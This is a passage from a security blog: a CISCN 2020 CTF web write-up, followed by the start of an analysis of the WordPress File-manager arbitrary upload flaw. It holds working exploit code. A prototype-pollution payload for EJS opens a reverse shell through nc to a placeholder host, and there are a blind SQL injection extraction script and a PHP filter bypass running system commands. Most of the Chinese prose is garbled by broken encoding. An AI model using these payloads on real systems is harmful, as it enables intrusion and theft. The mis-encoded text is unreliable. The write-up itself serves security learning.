<p>express-upload  åŸå‹é“¾æ±¡æŸ“ â€“&gt;  ejsæ¨¡æ¿rceã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;4_pATh_y0u_CaNN07_Gu3ss HTTP&#x2F;1.1</span><br><span class="line">Host: 172.20.7.107</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.102 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundarykhBq9JNmc6ZBCe9M</span><br><span class="line">Content-Length: 261</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarykhBq9JNmc6ZBCe9M</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;__proto__.outputFunctionName&quot;;</span><br><span class="line"></span><br><span class="line">_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&quot;cat &#x2F;flag.txt &gt; aa&quot;);var __tmp</span><br><span class="line">------WebKitFormBoundarykhBq9JNmc6ZBCe9M--</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/image-20200912135951627.png" alt="image-20200912135951627"></p>
<p><img src="/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/image-20200912171056211.png" alt="image-20200912171056211"></p>
<p><img src="/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/image-20200912140046413.png" alt="image-20200912140046413"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://172.20.7.107/4_pATh_y0u_CaNN07_Gu3ss"</span></span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">"__proto__.outputFunctionName"</span> : (<span class="literal">None</span>,<span class="string">"_tmp1;global.process.mainModule.require('child_process').exec(\"curl xxxx:6666\");var __tmp"</span>)</span><br><span class="line">&#125;</span><br><span class="line">payload = <span class="string">"_tmp1;global.process.mainModule.require('child_process').exec('rm /tmp/fa;mkfifo /tmp/fa;cat /tmp/fa|/bin/sh -i 2&gt;&amp;1|nc xxx 6666 &gt; /tmp/fa ');var __tmp2"</span></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">"__proto__.outputFunctionName"</span> : (<span class="literal">None</span>,payload)</span><br><span class="line">&#125;</span><br><span class="line">proxies = &#123;<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,<span class="string">"https"</span>: <span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line">re = requests.post(url, files = files, proxies=proxies)</span><br><span class="line"><span class="keyword">print</span> re.text</span><br></pre></td></tr></table></figure>

<h1 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h1><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://172.20.7.102/index.php"</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#erfenfa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">13</span>):</span><br><span class="line">	high = <span class="number">127</span></span><br><span class="line">	low = <span class="number">32</span></span><br><span class="line">	mid = (low + high) // <span class="number">2</span>	</span><br><span class="line">	<span class="keyword">while</span> high &gt; low:</span><br><span class="line">		payload = <span class="string">"||ascii(right(password,&#123;&#125;))/**/&gt;/**/&#123;&#125;#"</span></span><br><span class="line">		payload = payload.format((<span class="number">13</span>-i),mid)</span><br><span class="line">		data = &#123;</span><br><span class="line">			<span class="string">"username"</span>:<span class="string">"admin\\"</span>,</span><br><span class="line">			<span class="string">"password"</span>:payload</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">print</span> payload</span><br><span class="line">		r = requests.post(url,data=data,proxies=proxies)</span><br><span class="line">		<span class="comment">#print(r.content)</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">"error"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			low=mid+<span class="number">1</span> </span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			high=mid</span><br><span class="line">		mid=(low+high)//<span class="number">2</span></span><br><span class="line">	flag+=chr(mid)</span><br><span class="line">	print(flag)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/image-20200913125614666.png" alt="image-20200913125614666"></p>
<p>ç™»é™†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'gzmtu'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $gzmtu = $_GET[<span class="string">'gzmtu'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/(f|l|a|g|\.|t|x|\/|;|\"|\'|\`|\||\[|\]|\_|\^|=)/i'</span>,$gzmtu)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'forbidden'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = get_defined_functions()[<span class="string">'internal'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $gzmtu)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'nonono!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$gzmtu.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å–åç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.20.7.102&#x2F;c2ZtdHFs.php?gzmtu&#x3D;(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98%D1%8B%87%8B)</span><br><span class="line">system(&quot;cat &#x2F;flag.txt&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/13/2020ciscn%E5%8D%8E%E4%B8%9C%E5%8C%97%E5%88%86%E5%8C%BA%E8%B5%9Bweb%E9%A2%98%E7%9B%AEwp/image-20200913121916000.png" alt="image-20200913121916000"></p>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>PostgreSQLæ³¨å…¥ï¼Œæ²¡åšå‡ºæ¥ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p>
<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>ä¿®å¤æ˜¯æ‰çŸ¥é“æ˜¯ssrfï¼Œ</p>
<p>æœ‰ä¸€ä¸ªssrf.phpï¼Œæ®è¯´file:///flag å°±å¯ä»¥å¾—åˆ°flag</p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Wordpress File-manager ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†æ</title>
    <url>/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>ç´§æ€¥ï¼WordPressæ–‡ä»¶ç®¡ç†å™¨ï¼ˆfile managerï¼‰æ’ä»¶çˆ†ä¸¥é‡0dayæ¼æ´</p>
<a id="more"></a>

<blockquote>
<p>æœ¬æ–‡é¦–å‘äºå®‰å…¨å®¢ <a href="https://www.anquanke.com/post/id/216990" target="_blank" rel="noopener">Wordpress File-manager ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ†æ</a></p>
</blockquote>
<h1 id="0x01-æ¼æ´åˆ†æ"><a href="#0x01-æ¼æ´åˆ†æ" class="headerlink" title="0x01 æ¼æ´åˆ†æ"></a>0x01 æ¼æ´åˆ†æ</h1><p>åˆ†æç¯å¢ƒï¼š</p>
<ul>
<li>wordpress 5.5.1</li>
<li>file manager 6.0</li>
<li>win10   phpstudy   php 7.0.9</li>
</ul>
<p>æ¼æ´ç‚¹ä½äºfile managerçš„connector.minimal.phpæ–‡ä»¶ï¼Œå…·ä½“è·¯å¾„åœ¨<code>wordpress\wp-content\plugins\wp-file-manager\lib\php\connector.minimal.php</code></p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908121359135-1599734770059.png" alt="image-20200908121359135"></p>
<p>é¦–å…ˆå®ä¾‹åŒ–ä¸€ä¸ª<code>elFinderConnector</code>å¯¹è±¡ï¼Œç„¶åè°ƒç”¨å®ƒçš„<code>run()</code>æ–¹æ³•ï¼Œè·Ÿè¿›run();</p>
<p>wp-content/plugins/wp-file-manager/lib/php/elFinderConnector.class.php</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908133111974-1599734777018.png" alt="image-20200908133111974"></p>
<p>å¦‚æœHTTPè¯·æ±‚çš„æ–¹æ³•æ˜¯<code>POST</code>ä¼šæŠŠ<code>POST</code>å’Œ<code>GET</code>è¯·æ±‚çš„ä¿å­˜åˆ°<code>$src</code>ï¼Œç„¶ååˆ¤æ–­<code>POST</code>ä¼ çš„å‚æ•°ã€‚å¦‚æœä¸ä¼ å…¥<code>targets</code>ï¼Œå°±ä¸ä¼šè¿›å…¥å‰å‡ ä¸ªåˆ¤æ–­ï¼Œä¹‹åä¼šæŠŠ<code>POST</code>ä¼ çš„<code>cmd</code>å˜é‡èµ‹ç»™<code>$cmd</code>ï¼Œç„¶åè°ƒç”¨<code>commandExists()</code>æ£€æµ‹ä¼ å…¥çš„<code>$cmd</code>æ˜¯å¦å­˜åœ¨ã€‚</p>
<img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908125214608.png" alt="image-20200908125214608" style="zoom:150%;">

<p>ç„¶ååˆ©ç”¨<code>commandArgsList()</code>å‡½æ•°è·å–<code>$cmd</code>å¯¹åº”çš„å‘½ä»¤å‚æ•°åˆ—è¡¨ï¼Œæ¼æ´åˆ©ç”¨éœ€è¦ä¸Šä¼ æ–‡ä»¶ï¼Œè¿™é‡Œåªå…³æ³¨<code>$cmd</code>ä¸º<code>upload</code>çš„æƒ…å†µã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">commandArgsList</span><span class="params">($cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;commandExists($cmd)) &#123;</span><br><span class="line">            $list = <span class="keyword">$this</span>-&gt;commands[$cmd];</span><br><span class="line">            $list[<span class="string">'reqid'</span>] = <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $list = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $list;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*`upload`å¯¹åº”çš„æ•°ç»„å¦‚ä¸‹:</span></span><br><span class="line"><span class="comment">'upload' =&gt; array(</span></span><br><span class="line"><span class="comment">    'target' =&gt; true, 'FILES' =&gt; true, 'mimes' =&gt; false, 'html' =&gt; false, 'upload' =&gt; false, </span></span><br><span class="line"><span class="comment">    'name' =&gt; false, 'upload_path' =&gt; false, 'chunk' =&gt; false, 'cid' =&gt; false, 'node' =&gt; false, </span></span><br><span class="line"><span class="comment">    'renames' =&gt; false, 'hashes' =&gt; false, 'suffix' =&gt; false, 'mtime' =&gt; false, 'overwrite' =&gt; false, </span></span><br><span class="line"><span class="comment">    'contentSaveId' =&gt; false)</span></span><br><span class="line"><span class="comment">    */</span></span><br></pre></td></tr></table></figure>

<p>å¾ªç¯éå†ï¼Œå°†<code>POST</code>ä¼ å…¥çš„å‚æ•°ä¿å­˜åˆ°<code>$args</code>æ•°ç»„ä¸­ï¼Œç„¶åè°ƒç”¨<code>input_filter()</code>å‡½æ•°å¯¹<code>$args</code>è¿›è¡Œç®€å•çš„è¿‡æ»¤ï¼Œ</p>
<img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908130150392.png" alt="image-20200908130150392" style="zoom:150%;">

<p>æ›¿æ¢æ‰<code>%00</code>ï¼Œå¹¶ä¸”åš<code>stripslashes()</code>å¤„ç†ã€‚ç„¶åå°†é€šè¿‡è¡¨å•ä¸Šä¼ çš„æ–‡ä»¶<code>$_FILES</code>å­˜åˆ°<code>$args[&#39;FILE&#39;]</code>ä¸­ã€‚ç„¶åè°ƒç”¨<code>exec()</code>å‡½æ•°ï¼Œè·Ÿè¿›</p>
<p>wp-content/plugins/wp-file-manager/lib/php/elFinder.class.php</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908132919783-1599734791897.png" alt="image-20200908132919783"></p>
<p>å‰é¢ä¼šè¿›è¡Œä¸€äº›åˆ¤æ–­ï¼Œæœ€åè¿›å…¥åˆ°<code>$this-&gt;$cmd($args)</code>è°ƒç”¨<code>upload()</code>å‡½æ•°ï¼Œè·Ÿè¿›</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908151636282-1599734796269.png" alt="image-20200908151636282"></p>
<p>é¦–å…ˆå°†<code>POST</code>ä¼ å…¥çš„<code>target</code>èµ‹ç»™<code>$target</code>å˜é‡ï¼Œç„¶åè°ƒç”¨<code>volume()</code>å‡½æ•°ï¼Œ</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908152053795-1599734798968.png" alt="image-20200908152053795"></p>
<p>å¯ä»¥çœ‹åˆ°<code>$this-&gt;volume</code>æ•°ç»„å«æœ‰ä¸¤é¡¹ï¼Œä¸€é¡¹æ˜¯<code>l1_</code>ï¼Œä¸€é¡¹æ˜¯<code>t1_</code>ï¼Œ<code>volume()</code>å‡½æ•°å®šä¹‰å¦‚æœä¼ å…¥çš„<code>$hash</code>ä»¥<code>l1_</code>æˆ–<code>t1_</code>å¼€å¤´ï¼Œè¿”å›<code>$this-&gt;volume</code>æ•°ç»„å¯¹åº”çš„å€¼ï¼Œå¦åˆ™è¿”å›falseã€‚åœ¨<code>upload</code>å‡½æ•°ä¸­ä¼šæ£€æµ‹<code>$volume</code>ï¼Œå¦‚æœå…¶ä¸ºfalseï¼Œç¨‹åºä¼šæŠ¥é”™ç»“æŸï¼Œæ‰€ä»¥<code>POST</code>ä¼ å…¥çš„<code>target</code>å¿…é¡»ä»¥å®ƒä»¬ä¸¤ä¸ªä¸ºå‰ç¼€ã€‚ç»§ç»­åˆ†æupload()å‡½æ•°ã€‚ä¾æ¬¡å–å‡º<code>$args</code>æ•°ç»„ä¸­çš„å€¼èµ‹ç»™ç›¸åº”çš„å˜é‡ï¼Œè¿™é‡Œè¦æ±‚<code>$args[&#39;FILES&#39;][&#39;upload&#39;]</code>ä¹Ÿå°±æ˜¯<code>$_FILES[&#39;upload&#39;]</code>ä¸ºæ•°ç»„ï¼Œæ‰èƒ½å°†å…¶èµ‹ç»™<code>$files</code>å˜é‡ï¼Œè¿™å°±éœ€è¦ä¸Šä¼ æ–‡ä»¶æ—¶ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ•°ç»„ã€‚æ¥ä¸‹æ¥å…¶ä»–çš„å¦‚<code>htmlã€upload_pathã€chunkã€cidã€mtime</code>ç­‰å‚æ•°å¯ä»¥ä¸ä¼ ã€‚æ¥ä¸‹æ¥éå†<code>$files[&#39;name&#39;]</code>ä¹Ÿå°±æ˜¯<code>$_FILES[&#39;upload&#39;][&#39;name&#39;]</code>ï¼Œå¦‚æœæ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œå°†<code>$_FILES[&#39;upload&#39;][&#39;name&#39;]</code>èµ‹ç»™<code>$tmpname</code>ï¼Œç„¶åè°ƒç”¨<code>fopen()</code>æ‰“å¼€ä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶ï¼Œå°†æŒ‡é’ˆä¿å­˜åœ¨<code>$fp</code>ã€‚åœ¨ä¸ä¼ å¦‚<code>upload_path</code>æ—¶<code>$thashç­‰äº$target</code>ï¼Œæ‰€ä»¥<code>$_target</code>ä¸º<code>$target</code>ä¸ºæˆ‘ä»¬<code>POST</code>ä¼ å…¥çš„<code>target</code>å˜é‡ã€‚ä¹‹åè°ƒç”¨äº†<code>$volume-&gt;upload()</code>å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºä¹‹å‰æ‰“å¼€æ–‡ä»¶çš„æŒ‡é’ˆï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸º<code>POST</code>ä¼ å…¥çš„<code>target</code>å˜é‡ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºä¸Šä¼ çš„æ–‡ä»¶åï¼Œç¬¬å››ä¸ªå‚æ•°ä¸ºç©ºçš„æ•°ç»„ã€‚è·Ÿè¿›<code>elFinderVolumeDriver</code>çš„<code>upload()</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($fp, $dst, $name, $tmpname, $hashes = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;commandDisabled(<span class="string">'upload'</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;setError(elFinder::ERROR_PERM_DENIED);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (($dir = <span class="keyword">$this</span>-&gt;dir($dst)) == <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;setError(elFinder::ERROR_TRGDIR_NOT_FOUND, <span class="string">'#'</span> . $dst);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($dir[<span class="string">'write'</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;setError(elFinder::ERROR_PERM_DENIED);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;nameAccepted($name, <span class="keyword">false</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;setError(elFinder::ERROR_INVALID_NAME);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $mimeByName = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mimeDetect === <span class="string">'internal'</span>) &#123;</span><br><span class="line">            $mime = <span class="keyword">$this</span>-&gt;mimetype($tmpname, $name);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $mime = <span class="keyword">$this</span>-&gt;mimetype($tmpname, $name);</span><br><span class="line">            $mimeByName = <span class="keyword">$this</span>-&gt;mimetype($name, <span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">if</span> ($mime === <span class="string">'unknown'</span>) &#123;</span><br><span class="line">                $mime = $mimeByName;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;allowPutMime($mime) || ($mimeByName &amp;&amp; !<span class="keyword">$this</span>-&gt;allowPutMime($mimeByName))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;setError(elFinder::ERROR_UPLOAD_FILE_MIME, <span class="string">'('</span> . $mime . <span class="string">')'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $tmpsize = (int)sprintf(<span class="string">'%u'</span>, filesize($tmpname));</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;uploadMaxSize &gt; <span class="number">0</span> &amp;&amp; $tmpsize &gt; <span class="keyword">$this</span>-&gt;uploadMaxSize) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;setError(elFinder::ERROR_UPLOAD_FILE_SIZE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $dstpath = <span class="keyword">$this</span>-&gt;decode($dst);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($hashes[$name])) &#123;</span><br><span class="line">            $test = <span class="keyword">$this</span>-&gt;decode($hashes[$name]);</span><br><span class="line">            $file = <span class="keyword">$this</span>-&gt;stat($test);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $test = <span class="keyword">$this</span>-&gt;joinPathCE($dstpath, $name);</span><br><span class="line">            $file = <span class="keyword">$this</span>-&gt;isNameExists($test);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;clearcache();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($file &amp;&amp; $file[<span class="string">'name'</span>] === $name) &#123; <span class="comment">// file exists and check filename for item ID based filesystem</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;uploadOverwrite) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!$file[<span class="string">'write'</span>]) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;setError(elFinder::ERROR_PERM_DENIED);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> ($file[<span class="string">'mime'</span>] == <span class="string">'directory'</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;setError(elFinder::ERROR_NOT_REPLACE, $name);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;remove($test);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $name = <span class="keyword">$this</span>-&gt;uniqueName($dstpath, $name, <span class="string">'-'</span>, <span class="keyword">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $stat = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'mime'</span> =&gt; $mime,</span><br><span class="line">            <span class="string">'width'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">'height'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">'size'</span> =&gt; $tmpsize);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// $w = $h = 0;</span></span><br><span class="line">        <span class="keyword">if</span> (strpos($mime, <span class="string">'image'</span>) === <span class="number">0</span> &amp;&amp; ($s = getimagesize($tmpname))) &#123;</span><br><span class="line">            $stat[<span class="string">'width'</span>] = $s[<span class="number">0</span>];</span><br><span class="line">            $stat[<span class="string">'height'</span>] = $s[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// $this-&gt;clearcache();</span></span><br><span class="line">        <span class="keyword">if</span> (($path = <span class="keyword">$this</span>-&gt;saveCE($fp, $dstpath, $name, $stat)) == <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $stat = <span class="keyword">$this</span>-&gt;stat($path);</span><br><span class="line">        <span class="comment">// Try get URL</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($stat[<span class="string">'url'</span>]) &amp;&amp; ($url = <span class="keyword">$this</span>-&gt;getContentUrl($stat[<span class="string">'hash'</span>]))) &#123;</span><br><span class="line">            $stat[<span class="string">'url'</span>] = $url;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $stat;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆè¿›å…¥<code>commandDisabled()</code>å‡½æ•°ï¼Œè¿”å›falseã€‚</p>
<img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908150731360.png" alt="image-20200908150731360" style="zoom:150%;">

<p>ç„¶åè¿›å…¥<code>dir()</code>å‡½æ•°ï¼Œå‚æ•°ä¸º<code>$dst</code>å³<code>POST</code>ä¼ å…¥çš„<code>target</code>å€¼ã€‚</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908153636101-1599734809121.png" alt="image-20200908153636101"></p>
<p>è°ƒç”¨äº†fileå‡½æ•°ï¼Œ</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908153733922-1599734813491.png" alt="image-20200908153733922"></p>
<p>è·Ÿè¿›<code>decode()</code>å‡½æ•°</p>
<p><img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908153822619-1599734816115.png" alt="image-20200908153822619"></p>
<img src="/2020/09/10/Wordpress-File-manager-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20200908154015274.png" alt="image-20200908154015274" style="zoom:150%;">

<p>decode()å‡½æ•°é¦–å…ˆåˆ¤æ–­æ˜¯å¦ä»¥$this-&gt;idå¼€å¤´ï¼Œç„¶åæˆªå–å‡º<code>l1_</code>åé¢çš„å†…å®¹ï¼Œä¹‹åè¿›è¡Œbase64è§£å¯†ï¼Œuncryptå‡½æ•°å¦‚ä¸Šï¼Œæœªä½œæ“ä½œã€‚ç„¶åæ›´æ¢åˆ†éš”ç¬¦ï¼Œä¹‹åè°ƒç”¨<code>abspathCE()</code>å‡½æ•°ï¼Œä»æ³¨é‡Šä¸­å¯ä»¥çœ‹å‡ºï¼Œ<code>abspathCE()</code>å‡½æ•°ä¼šå…ˆåˆ¤æ–­$pathæ˜¯å¦ç­‰äºåˆ†éš”ç¬¦<code>\</code>,å¦‚æœç­‰äºï¼Œè¿”å›<code>$this-&gt;root</code>ï¼Œå¦åˆ™è¿”å›<code>$this-&gt;rootæ‹¼æ¥$path</code>ã€‚çœ‹ä¸‹å¯¹åº”çš„<code>abspathCE()</code>å‡½æ•°ã€‚</p>
